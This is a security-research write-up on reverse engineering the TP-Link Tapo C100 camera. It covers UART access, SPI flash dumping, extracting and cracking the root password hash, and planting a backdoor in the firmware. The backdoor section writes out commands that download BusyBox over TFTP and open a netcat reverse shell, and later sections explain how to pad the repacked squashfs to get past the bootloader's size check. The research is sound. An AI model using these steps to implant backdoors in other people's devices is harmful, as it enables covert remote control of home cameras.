# Tapo C100 reverse engineering

## Introduction

> The TP-Link Tapo C100 is a consumer-grade IP camera widely deployed in home and small-office
> environments. It provides features such as live video streaming, motion detection, infrared
> night vision, and tight integration with the Tapo mobile ecosystem.
>
> This project focuses on reverse engineering the Tapo C100 with the specific objective of
> achieving an interactive reverse shell on both the factory-installed firmware and the latest
> officially released firmware. Gaining shell access enables deeper inspection of the device’s
> runtime environment, including process behavior, filesystem layout, startup scripts, and security
> controls enforced by the vendor.
>
> By comparing the attack surface and protections present in the factory firmware against those
> introduced in newer firmware versions, this research aims to analyze how the device’s security
> model has evolved over time. This includes examining mitigation techniques, hardening measures,
> and changes in exposed services or interfaces.

> [!NOTE]
> **All activities described in this project are conducted for educational and security research purposes
> on owned hardware. The findings are intended to contribute to a better understanding of consumer IoT
> device security, support vulnerability research, and promote transparency and informed risk assessment
> in smart home deployments.**

## Using the FCC ID to Research Hardware Components

> Before acquiring the TP-Link Tapo C100 unit for this project, the device’s **FCC ID** was used
> as a starting point to gather information about the hardware platform and installed components.
> The FCC ID database, maintained by the U.S. Federal Communications Commission, contains publicly
> accessible filings submitted by manufacturers as part of radio equipment certification.
>
> By querying the Tapo C100’s FCC ID in the FCC Equipment Authorization System
> (available at `https://www.fcc.gov/oet/ea/fccid`), it is possible to retrieve documents such as
> internal photos, block diagrams, test reports, and parts lists that suppliers and module makers
> provided during certification. These documents often include:
>
> Using the FCC ID database allowed me to **identify the processor family, wireless chipset, and
> supporting modules** before purchasing the camera, enabling better preparation and tooling for
> teardown and firmware analysis. This preliminary research can greatly reduce guesswork in later
> stages of reverse engineering, such as selecting the correct JTAG/SWD interfaces or understanding
> flash memory characteristics.

> [!NOTE]
> **FCC ID filings are publicly available artifacts submitted for regulatory compliance and do
> not grant access to proprietary firmware or vendor source code.**

## UART Access and Initial Shell Discovery

> After gaining preliminary insight into the device’s internal components, the next step in the analysis was
> to obtain direct access to the system shell via a UART (Universal Asynchronous Receiver/Transmitter) interface
>  UART access is commonly present on embedded Linux-based devices and is frequently used by manufacturers for
> debugging, development, and factory testing.
>
> The first challenge was identifying the UART pinout on the camera’s PCB. As the interface is not documented
> publicly and not exposed through labeled headers, the process began with locating the ground (GND) reference
> point. A multimeter was used to identify ground by checking continuity against known ground planes and shielding
> on the board.
>
> Once ground was established, the remaining candidate pads were examined to distinguish transmit (TX) and
> receive (RX) lines. An oscilloscope was used to observe signal activity during the device’s boot sequence,
> allowing identification of pins exhibiting serial data patterns consistent with UART communication.
>
> Using a combination of multimeter measurements and oscilloscope inspection provided a reliable way to
> identify the UART interface while minimizing the risk of hardware damage. Establishing UART access enabled
> visibility into the boot process and system messages, forming the foundation for further analysis of the
> factory firmware and later firmware versions.

## Firmware Extraction from External SPI Flash

> The next objective was to obtain a full dump of the device firmware stored on the external SPI flash memory.
> At the time this work began, a dedicated flash programmer (such as an XGecu T48) was not in my possession,
> which led to the development of a temporary, custom solution.
>
> A primitive SPI flash reader was implemented using an STM32F4 microcontroller. Due to the limited RAM available
> on the MCU, it was not feasible to buffer the entire firmware image in memory. Instead, the firmware was read
> incrementally, with each chunk transmitted immediately before proceeding to the next read operation.
>
> To persist the extracted data, semihosting was used in combination with a J-Link debugger. This approach
> allowed the MCU firmware to open and write directly to a file on the host system while the SPI flash was being
> read. Although this method introduced significant performance overhead, it enabled a complete 8 MB firmware
> image to be extracted without specialized hardware.
>
> The extraction process was slow but reliable, and it allowed firmware analysis to begin while waiting for the
> dedicated flash programmer to arrive. Once the XGecu device arrived, the same SPI flash was read again using
> the programmer, and the resulting dump was compared against the STM32-based extraction. The two images matched
>  confirming the correctness of the custom reader implementation. As expected, the dedicated programmer
> completed the task a lot faster.
>
> With a verified firmware image available, binwalk was used to analyze the firmware structure, identify embedded
> components, and locate filesystems and executable segments.

## Authentication and Password Analysis

> Once UART connectivity between the host terminal and the device was established, the next hurdle was
> authenticating to obtain an interactive shell. The serial console presented a login prompt, but there
> was no official documentation available for default credentials on either the factory or updated firmware.
>
> To understand how the password system might work, background research was done, including reviewing the detailed
> reverse-engineering write-up by Landon Crabtree on the Tapo C100. This embedded hacking note describes hardware
> exploration and approaches to gaining shell access on the same model of camera, providing useful context on the
> device’s authentication mechanisms and internal structure.
>
> Based on that research and subsequent firmware inspection, it appeared that the factory password scheme was not
> purely random. Instead, the hashes seemed related to predictable device identifiers such as the MCU name
> combined with a fixed seed or *SLP* word — a pattern documented in Crabtree’s analysis.
>
> To assess the difficulty of recovering the actual login credentials, an offline hash-cracking approach was
> attempted using **hashcat** accelerated by an AMD Radeon RX 7800 XT GPU. The goal was to estimate how long
> it would take to recover the password hash derived from the observed scheme using modern consumer hardware.

### But how to obtain passwd and shadow files where the password hash is stored?

> After extracting the firmware with `binwalk`, search the extracted filesystem for password entries by looking
> for lines that start with `root:`.

```console
~ grep -ar "^root:" <path-to-extraction-dir>
```

```console
~ grep -ar "^root:" .
./1E1A62/decompressed.bin:root:$1$lI7mZm78$dA8pGGOerrGJXj7Tp2yQg/:0:0:root:/root:/bin/ash
./1E1A62/decompressed.bin:root:x:0:0:99999:7:::
```

## Backdoor script

> This shell script waits for network connectivity, downloads a BusyBox
> binary via TFTP, and repeatedly attempts to establish a reverse shell
> connection to a remote host.

### Step-by-step behavior

1. **Waits for internet access**

   > The script continuously pings `google.com` until a response is received,
   > indicating that network connectivity is available.

2. **Downloads payload**

   > Once the network is up, the script changes to the `/tmp` directory and
   > downloads a MIPS little-endian BusyBox binary from a TFTP server.

   ```sh
   tftp -g <ip-address> -r busybox-mipsel
   ```

3. **Makes the binary executable**

   > The downloaded file is marked as executable so it can be run.

   ```sh
   chmod +x busybox-mipsel
   ```

4. **Establishes a reverse shell**

   > The script enters an infinite loop and repeatedly attempts to connect
   > back to a remote host using netcat, spawning a shell on successful
   > connection.

   ```sh
   ./busybox-mipsel nc <ip-address> <port> -e /bin/sh
   ```

## Make squashfs filesystem

> Display filesystem superblock information

```console
~ unsquashfs -s <old-squashfs>
```

> Make squashfs with backdoor.sh script

```console
~ mksquashfs <unsquashed-filesystem> <new-squashfs> -comp <compression> -b <block size>
```

## Make image

```console
~ mkimage -A <arch> -O <os> -T <type> -C <compresion> -a <addr> -e <entry> -n <name> -d <input> <output>
```

## Merge uimage part with modified squashfs

```console
~ dd if=<uimage_part> of=<final_image> bs=1 count=<number-of-bytes>
~ dd if=<squashfs_part> of=<final_image> bs=1 seek=$((<hex-address>))
```

## SquashFS validation by size

> The bootloader validates the SquashFS (rootfs) partition **by size**, not by content(?).
> During firmware validation, U-Boot checks that the compressed SquashFS image
> **exactly matches the size defined in the partition table (TP header)**.
>
> Because of this, any modification to files inside the SquashFS (even a single byte)
> will usually change the final compressed image size, causing validation to fail and
> the firmware to be rejected.
>
> To work around this, an audio file was modified inside the filesystem and then recompress SquashFS
> **until the resulting image has exactly the same size as the original**.
> This preserves the expected partition size while still allowing controlled content changes.

## Image Merge Script (`mrgimg.sh`)

> This script merges a binary firmware part into an existing base
> image at a specified offset, producing a new combined output image.
> It is commonly used in firmware reconstruction workflows where
> individual partitions must be reinserted into a full flash dump.

### Usage

```console
~ ./mrgimg.sh <part-to-merge> <size> <output-img>
```

## SquashFS Size-Tuning Script

> This Bash script repeatedly rebuilds a SquashFS filesystem and
> dynamically adjusts its contents until the resulting filesystem
> matches a **target size exactly**. It is useful when repacking firmware
> images that require a SquashFS partition to have a **precise byte
> length** (e.g., fixed-offset flash layouts).
>
> The script runs in a loop, incrementally adding or removing data from a
> file inside the filesystem until the desired size is reached.

```console
./tunesquashfs <squashfs-root-dir> <block-size> <compression> <expected-size> <squashfs-output>
```

```console
.
